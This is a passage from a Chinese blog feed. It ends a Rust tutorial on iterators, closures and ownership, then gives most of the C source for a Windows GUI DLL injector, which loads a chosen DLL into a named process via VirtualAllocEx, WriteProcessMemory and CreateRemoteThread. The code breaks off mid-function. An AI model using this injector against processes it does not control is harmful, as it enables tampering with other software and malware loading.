<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">sum</span>: <span class="type">i32</span> = arr.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">fold</span>(<span class="number">0</span>, |acc, &amp;x| acc + x);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, sum); <span class="comment">// 输出: 10</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>fold()</code> 方法从初始值 0 开始，对数组中的每个元素进行累加，最终得到数组元素的总和。</p>
<ul>
<li><strong><code>skip()</code>：跳过指定数量的元素。</strong></li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">skipped</span>: <span class="type">Vec</span>&lt;_&gt; = arr.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">skip</span>(<span class="number">2</span>).<span class="title function_ invoke__">collect</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, skipped); <span class="comment">// 输出: [3, 4]</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>skip(2)</code> 方法跳过了数组中的前两个元素，返回了从第三个元素开始的新迭代器。</p>
<ul>
<li><strong><code>take()</code>：获取指定数量的元素。</strong></li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">taken</span>: <span class="type">Vec</span>&lt;_&gt; = arr.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">take</span>(<span class="number">2</span>).<span class="title function_ invoke__">collect</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, taken); <span class="comment">// 输出: [1, 2]</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>take(2)</code> 方法只获取了数组中的前两个元素。</p>
<ul>
<li><strong><code>enumerate()</code>：为每个元素提供索引。</strong></li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">arr</span> = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>];</span><br><span class="line"><span class="keyword">for</span> (i, &amp;value) <span class="keyword">in</span> arr.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Element at index &#123;&#125; is &#123;&#125;&quot;</span>, i, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line"><span class="comment">// Element at index 0 is 10</span></span><br><span class="line"><span class="comment">// Element at index 1 is 20</span></span><br><span class="line"><span class="comment">// Element at index 2 is 30</span></span><br><span class="line"><span class="comment">// Element at index 3 is 40</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>enumerate()</code> 方法为数组中的每个元素提供了一个索引，你可以同时访问索引和元素的值。</p>
<p>迭代器内容好多啊。。。不想学了，用的时候再学，更多内容请看<a href="https://www.runoob.com/rust/rust-iter.html">Rust 迭代器 | 菜鸟教程 (runoob.com)</a></p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>一开始学没太明白这是个什么东西，他和函数差不多，所以先看一下它和函数的区别：</p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">闭包</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>匿名性</strong></td>
<td align="left">是匿名的，可存储为变量</td>
<td align="left">有固定名称</td>
</tr>
<tr>
<td align="left"><strong>环境捕获</strong></td>
<td align="left">可以捕获外部变量</td>
<td align="left">不能捕获外部变量</td>
</tr>
<tr>
<td align="left"><strong>定义方式</strong></td>
<td align="left">&#96;</td>
<td align="left">参数</td>
</tr>
<tr>
<td align="left"><strong>类型推导</strong></td>
<td align="left">参数和返回值类型可以推导</td>
<td align="left">必须显式指定</td>
</tr>
<tr>
<td align="left"><strong>存储与传递</strong></td>
<td align="left">可以作为变量、参数、返回值</td>
<td align="left">同样支持</td>
</tr>
</tbody></table>
<h3 id="闭包的声明"><a href="#闭包的声明" class="headerlink" title="闭包的声明"></a>闭包的声明</h3><p>闭包的语法声明：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">closure_name</span> = |参数列表| 表达式或语句块;</span><br></pre></td></tr></table></figure>

<p>参数可以有类型注解，也可以省略，Rust 编译器会根据上下文推断它们。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">add_one</span> = |x: <span class="type">i32</span>| x + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><strong>闭包的参数和返回值：</strong> 闭包可以有零个或多个参数，并且可以返回一个值。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">calculate</span> = |a, b, c| a * b + c;</span><br></pre></td></tr></table></figure>

<p><strong>闭包的调用：</strong>闭包可以像函数一样被调用。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">result</span> = <span class="title function_ invoke__">calculate</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>闭包在 Rust 中类似于匿名函数，可以在代码中以 <strong>{}</strong> 语法块的形式定义，使用 <strong>||</strong> 符号来表示参数列表，实例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let add = |a, b| a + b;</span><br><span class="line">println!(&quot;&#123;&#125;&quot;, add(2, 3)); // 输出: 5</span><br></pre></td></tr></table></figure>

<p>在这个示例中，add 是一个闭包，接受两个参数 a 和 b，返回它们的和。</p>
<h3 id="捕获外部变量"><a href="#捕获外部变量" class="headerlink" title="捕获外部变量"></a>捕获外部变量</h3><p>闭包可以捕获周围环境中的变量，这意味着它可以访问定义闭包时所在作用域中的变量。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let x = 5;</span><br><span class="line">let square = |num| num * x;</span><br><span class="line">println!(&quot;&#123;&#125;&quot;, square(3)); // 输出: 15</span><br></pre></td></tr></table></figure>

<p>以上代码中，闭包 square 捕获了外部变量 x，并在闭包体中使用了它。</p>
<p>闭包可以通过三种方式捕获外部变量：</p>
<ul>
<li><strong>按引用捕获</strong>（默认行为，类似 <code>&amp;T</code>）</li>
<li><strong>按值捕获</strong>（类似 <code>T</code>）</li>
<li><strong>可变借用捕获</strong>（类似 <code>&amp;mut T</code>）</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">num</span> = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按引用捕获</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">print_num</span> = || <span class="built_in">println!</span>(<span class="string">&quot;num = &#123;&#125;&quot;</span>, num);</span><br><span class="line">    <span class="title function_ invoke__">print_num</span>(); <span class="comment">// 输出: num = 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按值捕获</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">take_num</span> = <span class="keyword">move</span> || <span class="built_in">println!</span>(<span class="string">&quot;num taken = &#123;&#125;&quot;</span>, num);</span><br><span class="line">    <span class="title function_ invoke__">take_num</span>(); <span class="comment">// 输出: num taken = 5</span></span><br><span class="line">    <span class="comment">// println!(&quot;&#123;&#125;&quot;, num); // 若取消注释，将报错，num 所有权被转移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可变借用捕获</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">change_num</span> = || num += <span class="number">1</span>;</span><br><span class="line">    <span class="title function_ invoke__">change_num</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;num after closure = &#123;&#125;&quot;</span>, num); <span class="comment">// 输出: num after closure = 6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<ul>
<li>闭包默认按引用捕获外部变量。</li>
<li>使用 <code>move</code> 关键字可以强制按值捕获，将外部变量的所有权转移到闭包内。</li>
<li>如果闭包需要修改外部变量，需显式声明为 <code>mut</code> 闭包。</li>
</ul>
<h3 id="移动与借用"><a href="#移动与借用" class="headerlink" title="移动与借用"></a>移动与借用</h3><p>闭包可以通过 <strong>move</strong> 关键字获取外部变量的所有权，或者通过借用的方式获取外部变量的引用。例如：</p>
<p><strong>借用变量：</strong>默认情况下，闭包会借用它捕获的环境中的变量，这意味着闭包可以使用这些变量，但不能改变它们的所有权。这种情况下，闭包和外部作用域都可以使用这些变量。例如：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">add_x</span> = |y| x + y;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="title function_ invoke__">add_x</span>(<span class="number">5</span>)); <span class="comment">// 输出 15</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x); <span class="comment">// 仍然可以使用 x</span></span><br></pre></td></tr></table></figure>

<p><strong>获取所有权：</strong>通过在闭包前添加 move 关键字，闭包会获取它捕获的环境变量的所有权。这意味着这些变量的所有权会从外部作用域转移到闭包内部，外部作用域将无法再使用这些变量。例如：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">print_s</span> = <span class="keyword">move</span> || <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s);</span><br><span class="line"><span class="title function_ invoke__">print_s</span>(); <span class="comment">// 输出 &quot;hello&quot;</span></span><br><span class="line"><span class="comment">// println!(&quot;&#123;&#125;&quot;, s); // 这行代码将会报错，因为 s 的所有权已经被转移给了闭包</span></span><br></pre></td></tr></table></figure>

<p>通过这两种方式，Rust 提供了灵活的机制来处理闭包与外部变量之间的关系，使得在编写并发、安全的代码时更加方便。</p>
<p>闭包也就先学到这里，更多请看<a href="https://www.runoob.com/rust/rust-closure.html">Rust 闭包 | 菜鸟教程 (runoob.com)</a></p>
<h2 id="所有权"><a href="#所有权" class="headerlink" title="所有权"></a>所有权</h2><p>所有权规则：</p>
<ul>
<li>Rust 中的每个值都有一个变量，称为其所有者。</li>
<li>一次只能有一个所有者。</li>
<li>当所有者不在程序运行范围时，该值将被删除。</li>
</ul>
<h3 id="变量范围"><a href="#变量范围" class="headerlink" title="变量范围"></a>变量范围</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 在声明以前，变量 s 无效</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="string">&quot;runoob&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里是变量 s 的可用范围</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 变量范围已经结束，变量 s 无效</span></span><br></pre></td></tr></table></figure>

<p>变量范围是变量的一个属性，其代表变量的可行域，默认从声明变量开始有效直到变量所在域结束。</p>
<h3 id="内存和分配"><a href="#内存和分配" class="headerlink" title="内存和分配"></a>内存和分配</h3><p>如在C语言中，假设有一个字符串<code>Hello World</code>，然后有以下程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *s = strdup(<span class="string">&quot;runoob&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(s); <span class="comment">// 释放 s 资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在C语言程序中需要使用<code>free</code>手动释放内存，但是在rust中，不需要手动释放内存，当一个变量在其变量范围结束时rust会自动释放该变量。</p>
]]></content>
  </entry>
  <entry>
    <title>随笔-一个DLL注入器</title>
    <url>/2024/11/19/s-11-19/</url>
    <content><![CDATA[<h1 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>使用CreateRemoteThread，在Debug下编译，简单的创建远程线程，没有反反注入</p>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:28251)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BUTTON 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_EDIT_1 0x101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_EDIT_2 0x102</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>;</span><br><span class="line">HINSTANCE g_hInstance;</span><br><span class="line">HWND g_hwnd;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="type">const</span> <span class="type">char</span>* szDllPathName)</span> &#123;</span><br><span class="line"></span><br><span class="line">	BOOL bRet;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	DWORD dwLength;</span><br><span class="line">	DWORD dwLoadAddr;</span><br><span class="line">	LPVOID lpAllocAddr;</span><br><span class="line">	DWORD dwThreadID;</span><br><span class="line">	HMODULE hModule;</span><br><span class="line"></span><br><span class="line">	bRet = <span class="number">0</span>;</span><br><span class="line">	dwLoadAddr = <span class="number">0</span>;</span><br><span class="line">	hProcess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 1. 获取进程句柄  被注入的进程的句柄</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        MessageBox(g_hwnd, TEXT(<span class="string">&quot;OpenProcess failed!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2. 获取DLL文件路径的长度，并在最后+1，因为要加上0结尾的长度</span></span><br><span class="line">	dwLength = <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. 在目标进程分配内存  在被注入的进程中分别配一段空间，存储DLL的地址</span></span><br><span class="line">	lpAllocAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        MessageBox(g_hwnd, TEXT(<span class="string">&quot;VirtualAllocEx failed!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 4. 拷贝DLL路径名字到被注入进程的内存</span></span><br><span class="line">	bRet = WriteProcessMemory(hProcess, lpAllocAddr, reinterpret_cast&lt;LPCVOID&gt;(szDllPathName), dwLength, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">        MessageBox(g_hwnd, TEXT(<span class="string">&quot;WriteProcessMemory failed!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 5. 获取模块句柄</span></span><br><span class="line">	<span class="comment">// LoadLibrary这个函数是在kernel32.dll这个模块中的，所以需要先获取kernel32.dll这个模块的句柄</span></span><br><span class="line">	hModule = GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hModule) &#123;</span><br><span class="line">        MessageBox(g_hwnd, TEXT(<span class="string">&quot;GetModuleHandle failed!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 6. 获取LoadLibraryA函数地址</span></span><br><span class="line">	dwLoadAddr = reinterpret_cast&lt;DWORD&gt;(GetProcAddress(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span> (!dwLoadAddr) &#123;</span><br><span class="line">        MessageBox(g_hwnd, TEXT(<span class="string">&quot;GetProcessAddress failed!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">		CloseHandle(hModule);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 7. 创建远程线程，加载DLL</span></span><br><span class="line">	hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(dwLoadAddr), lpAllocAddr, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line">	<span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">        MessageBox(g_hwnd, TEXT(<span class="string">&quot;CreateRemoteThread failed!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">		CloseHandle(hModule);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">GetProcessIdByName</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* processName)</span> &#123;</span><br><span class="line">	HANDLE hSnap;</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	DWORD processId = <span class="number">0</span>;</span><br><span class="line">	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        MessageBox(g_hwnd, TEXT(<span class="string">&quot;Failed to create process snapshot!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	<span class="keyword">if</span> (!Process32First(hSnap, &amp;pe32)) &#123;</span><br><span class="line">        MessageBox(g_hwnd, TEXT(<span class="string">&quot;Failed to get the first process!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">		CloseHandle(hSnap);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>((<span class="type">char</span> <span class="type">const</span>*)pe32.szExeFile, processName) == <span class="number">0</span>) &#123;</span><br><span class="line">			processId = pe32.th32ProcessID;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!Process32Next(hSnap, &amp;pe32)) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hSnap);</span><br><span class="line">	<span class="keyword">return</span> processId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">    TCHAR className[] = TEXT(<span class="string">&quot;DllInjector&quot;</span>);</span><br><span class="line">    WNDCLASS wndclass = &#123; <span class="number">0</span> &#125;;                                </span><br><span class="line">    wndclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;        </span><br><span class="line">    wndclass.lpszClassName = className;                        </span><br><span class="line">    wndclass.hInstance = hInstance;                           </span><br><span class="line">    wndclass.lpfnWndProc = WindowProc;</span><br><span class="line">    RegisterClass(&amp;wndclass);                                       </span><br><span class="line"></span><br><span class="line">    HWND hwnd = CreateWindow(className,TEXT(<span class="string">&quot;Dll Injector (CreateRemoteThread)&quot;</span>),WS_OVERLAPPEDWINDOW,<span class="number">300</span>,<span class="number">350</span>,<span class="number">320</span>,<span class="number">180</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,hInstance,<span class="literal">NULL</span>);</span><br><span class="line">    g_hwnd = hwnd;</span><br><span class="line">    <span class="keyword">if</span> (hwnd == <span class="literal">NULL</span>)                       </span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;CreateWindow failed!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ShowWindow(hwnd, SW_SHOW);</span><br><span class="line">    <span class="comment">//消息处理</span></span><br><span class="line">    MSG msg;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    <span class="keyword">while</span> ((bRet = GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (bRet == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;GetMessage failed!&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 转换消息</span></span><br><span class="line">            TranslateMessage(&amp;msg);</span><br><span class="line">            <span class="comment">// 分发消息</span></span><br><span class="line">            DispatchMessage(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息处理函数</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">    &#123;</span><br><span class="line">        PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WM_CREATE:</span><br><span class="line">    &#123;</span><br><span class="line">		CreateWindow(TEXT(<span class="string">&quot;EDIT&quot;</span>), TEXT(<span class="string">&quot;&quot;</span>), WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_MULTILINE, <span class="number">100</span>, <span class="number">20</span>, <span class="number">170</span>, <span class="number">20</span>, hwnd, (HMENU)IDC_EDIT_1, g_hInstance, <span class="literal">NULL</span>);</span><br><span class="line">		CreateWindow(TEXT(<span class="string">&quot;EDIT&quot;</span>), TEXT(<span class="string">&quot;&quot;</span>), WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_MULTILINE, <span class="number">100</span>, <span class="number">55</span>, <span class="number">170</span>, <span class="number">20</span>, hwnd, (HMENU)IDC_EDIT_2, g_hInstance, <span class="literal">NULL</span>);</span><br><span class="line">		CreateWindow(TEXT(<span class="string">&quot;STATIC&quot;</span>), TEXT(<span class="string">&quot;进程名：&quot;</span>), WS_CHILD | WS_VISIBLE, <span class="number">15</span>, <span class="number">20</span>, <span class="number">75</span>, <span class="number">20</span>, hwnd, <span class="literal">NULL</span>, g_hInstance, <span class="literal">NULL</span>);</span><br><span class="line">		CreateWindow(TEXT(<span class="string">&quot;STATIC&quot;</span>), TEXT(<span class="string">&quot;DLL路径：&quot;</span>), WS_CHILD | WS_VISIBLE, <span class="number">15</span>, <span class="number">55</span>, <span class="number">75</span>, <span class="number">20</span>, hwnd, <span class="literal">NULL</span>, g_hInstance, <span class="literal">NULL</span>);</span><br><span class="line">		CreateWindow(TEXT(<span class="string">&quot;BUTTON&quot;</span>), TEXT(<span class="string">&quot;注入DLL&quot;</span>), WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">30</span>, hwnd, (HMENU)IDC_BUTTON, g_hInstance, <span class="literal">NULL</span>);</span><br><span class="line">		DragAcceptFiles(hwnd, TRUE);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> IDC_BUTTON:</span><br><span class="line">        &#123;</span><br><span class="line">            TCHAR processName[<span class="number">0x200</span>];</span><br><span class="line">            TCHAR dllPath[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取IDC_EDIT_1中的字符串</span></span><br><span class="line">            HWND hEdit1 = GetDlgItem(hwnd, IDC_EDIT_1);</span><br><span class="line">            GetWindowText(hEdit1, processName, <span class="keyword">sizeof</span>(processName));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取IDC_EDIT_2中的字符串</span></span><br><span class="line">            HWND hEdit2 = GetDlgItem(hwnd, IDC_EDIT_2);</span><br><span class="line">            GetWindowText(hEdit2, dllPath, <span class="keyword">sizeof</span>(dllPath));</span><br><span class="line"></span><br><span class="line">            DWORD processId = GetProcessIdByName((<span class="type">const</span> <span class="type">char</span>*)processName);</span><br><span class="line">            <span class="keyword">if</span> (processId == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                MessageBox(hwnd, TEXT(<span class="string">&quot;Failed to find the process&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 注入DLL</span></span><br><span class="line">            <span class="keyword">if</span> (LoadDll(processId, (<span class="type">const</span> <span class="type">char</span>*)dllPath)) &#123;</span><br><span class="line">                MessageBox(hwnd, TEXT(<span class="string">&quot;DLL injected successfully.&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                MessageBox(hwnd, TEXT(<span class="string">&quot;Failed to inject DLL.&quot;</span>), TEXT(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WM_DROPFILES:</span><br><span class="line">    